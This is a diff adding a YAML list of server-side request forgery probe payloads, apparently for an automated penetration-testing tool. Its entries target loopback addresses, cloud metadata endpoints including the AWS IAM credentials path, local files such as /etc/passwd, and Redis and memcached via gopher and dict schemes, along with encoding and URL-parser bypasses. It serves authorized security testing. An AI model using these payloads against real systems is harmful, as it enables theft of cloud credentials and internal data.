@@ -1,0 +1,177 @@
+# Curated SSRF probe payloads for authorized web security testing.
+#
+# Fields per entry:
+#   id              — stable identifier (kebab-case, category-prefixed).
+#   category        — one of:
+#                       internal-loopback | metadata-aws | metadata-gcp |
+#                       metadata-azure    | scheme-bypass | encoding-bypass |
+#                       hostname-tricks   | protocol-smuggle.
+#   payload         — the raw URL the specialist feeds to the target's
+#                     URL-accepting parameter.
+#   expected_marker — substring the specialist grepss for in the SSRF
+#                     response body to treat the probe as confirmed
+#                     without needing the OOB listener. ``null`` means
+#                     OOB-based confirmation only.
+#   notes           — what the payload is trying to bypass / prove.
+#
+# No real OOB-as-a-service domains appear here. For true out-of-band
+# confirmation the specialist injects a URL served by
+# :class:`penage.specialists.shared.oob_listener.OobListener`.
+
+# --- internal-loopback ---
+- id: ssrf-loopback-basic
+  category: internal-loopback
+  payload: "http://127.0.0.1/"
+  expected_marker: null
+  notes: "Plain IPv4 loopback; succeeds iff the target fetches arbitrary URLs without SSRF defence."
+
+- id: ssrf-loopback-localhost
+  category: internal-loopback
+  payload: "http://localhost/"
+  expected_marker: null
+  notes: "DNS-resolved loopback; bypasses naive IP-literal blocklists."
+
+- id: ssrf-loopback-any
+  category: internal-loopback
+  payload: "http://0.0.0.0/"
+  expected_marker: null
+  notes: "0.0.0.0 routes to loopback on Linux; often missed by filters that only deny 127.0.0.1."
+
+- id: ssrf-loopback-ipv6
+  category: internal-loopback
+  payload: "http://[::1]/"
+  expected_marker: null
+  notes: "IPv6 loopback literal; defeats filters that only check IPv4 strings."
+
+- id: ssrf-loopback-short-form
+  category: internal-loopback
+  payload: "http://127.1/"
+  expected_marker: null
+  notes: "BSD-style shortened IPv4 (127.1 == 127.0.0.1); bypasses naive regex filters."
+
+- id: ssrf-loopback-ssh-port
+  category: internal-loopback
+  payload: "http://127.0.0.1:22/"
+  expected_marker: null
+  notes: "Loopback on SSH port; a banner / connection-refused difference reveals internal port state."
+
+# --- metadata-aws ---
+- id: ssrf-aws-metadata-root
+  category: metadata-aws
+  payload: "http://169.254.169.254/latest/meta-data/"
+  expected_marker: "ami-id"
+  notes: "AWS EC2 IMDS v1 root; body lists metadata keys including ``ami-id``."
+
+- id: ssrf-aws-iam-credentials
+  category: metadata-aws
+  payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+  expected_marker: "AccessKeyId"
+  notes: "IAM role credentials endpoint; successful read leaks ``AccessKeyId`` in JSON."
+
+- id: ssrf-aws-user-data
+  category: metadata-aws
+  payload: "http://169.254.169.254/latest/user-data/"
+  expected_marker: "#!"
+  notes: "EC2 user-data; often a shebang-prefixed bootstrap script, hence the ``#!`` marker."
+
+# --- metadata-gcp ---
+- id: ssrf-gcp-metadata-root
+  category: metadata-gcp
+  payload: "http://metadata.google.internal/computeMetadata/v1/"
+  expected_marker: "computeMetadata"
+  notes: "GCP metadata root. Real reads need header ``Metadata-Flavor: Google``; this probe tests reachability of the hostname."
+
+- id: ssrf-gcp-service-accounts
+  category: metadata-gcp
+  payload: "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/"
+  expected_marker: "default"
+  notes: "GCP service-account enumeration via the link-local IP; ``default/`` listed on success."
+
+# --- metadata-azure ---
+- id: ssrf-azure-instance-metadata
+  category: metadata-azure
+  payload: "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+  expected_marker: null
+  notes: "Azure IMDS. Requires request header ``Metadata: true`` — this probe-set does not yet add custom headers, so positive hits are unlikely without specialist-side header injection."
+
+# --- scheme-bypass ---
+- id: ssrf-file-unix-passwd
+  category: scheme-bypass
+  payload: "file:///etc/passwd"
+  expected_marker: "root:x:"
+  notes: "``file://`` scheme read of the Unix passwd file; works when the URL client (libcurl, PHP streams) enables the file wrapper."
+
+- id: ssrf-file-windows-ini
+  category: scheme-bypass
+  payload: "file:///c:/windows/win.ini"
+  expected_marker: "[fonts]"
+  notes: "Windows counterpart; ``win.ini`` has a stable ``[fonts]`` section marker."
+
+- id: ssrf-gopher-redis
+  category: scheme-bypass
+  payload: "gopher://127.0.0.1:6379/_INFO"
+  expected_marker: "redis_version"
+  notes: "Gopher smuggling to an unauthenticated Redis on loopback; INFO reply contains ``redis_version``."
+
+- id: ssrf-dict-memcached
+  category: scheme-bypass
+  payload: "dict://127.0.0.1:11211/stats"
+  expected_marker: "STAT version"
+  notes: "``dict://`` scheme aimed at a memcached-style service; ``STAT version`` is the first line of the memcached stats response."
+
+# --- encoding-bypass ---
+- id: ssrf-ip-decimal
+  category: encoding-bypass
+  payload: "http://2130706433/"
+  expected_marker: null
+  notes: "127.0.0.1 as a 32-bit integer; defeats filters that only match dotted-quad IPs."
+
+- id: ssrf-ip-hex
+  category: encoding-bypass
+  payload: "http://0x7f000001/"
+  expected_marker: null
+  notes: "127.0.0.1 in hex; same defeat surface as decimal."
+
+- id: ssrf-ip-octal
+  category: encoding-bypass
+  payload: "http://017700000001/"
+  expected_marker: null
+  notes: "127.0.0.1 in octal; historically honoured by inet_aton-backed resolvers."
+
+- id: ssrf-url-fragment-trick
+  category: encoding-bypass
+  payload: "http://127.0.0.1%23.evil.com/"
+  expected_marker: null
+  notes: "``%23`` decodes to ``#``; a naive parser sees host ``evil.com`` after the fragment, libcurl connects to ``127.0.0.1``."
+
+# --- hostname-tricks ---
+- id: ssrf-oob-placeholder
+  category: hostname-tricks
+  payload: "http://oob.placeholder.invalid/"
+  expected_marker: null
+  notes: "Placeholder for OOB-only confirmation. The specialist rewrites this host to the live URL served by OobListener at runtime; never treat the literal domain as routable."
+
+- id: ssrf-localtest-me
+  category: hostname-tricks
+  payload: "http://localtest.me/"
+  expected_marker: null
+  notes: "``localtest.me`` resolves to 127.0.0.1 via public DNS; bypasses filters that only inspect IP literals."
+
+- id: ssrf-dotless-localhost-subdomain
+  category: hostname-tricks
+  payload: "http://customer1.app.localhost.my.company/"
+  expected_marker: null
+  notes: "Multi-label hostname embedding ``localhost``; some resolvers short-circuit to loopback on the leftmost matching label."
+
+# --- protocol-smuggle ---
+- id: ssrf-userinfo-fragment
+  category: protocol-smuggle
+  payload: "http://example.com#@127.0.0.1/"
+  expected_marker: null
+  notes: "Fragment-then-userinfo trick; WHATWG URL parser versus RFC 3986 parser disagree on the authority section."
+
+- id: ssrf-userinfo-at
+  category: protocol-smuggle
+  payload: "http://example.com@127.0.0.1/"
+  expected_marker: null
+  notes: "Classic userinfo smuggling; naive allowlists that regex for ``example.com`` accept this while the real host is 127.0.0.1."
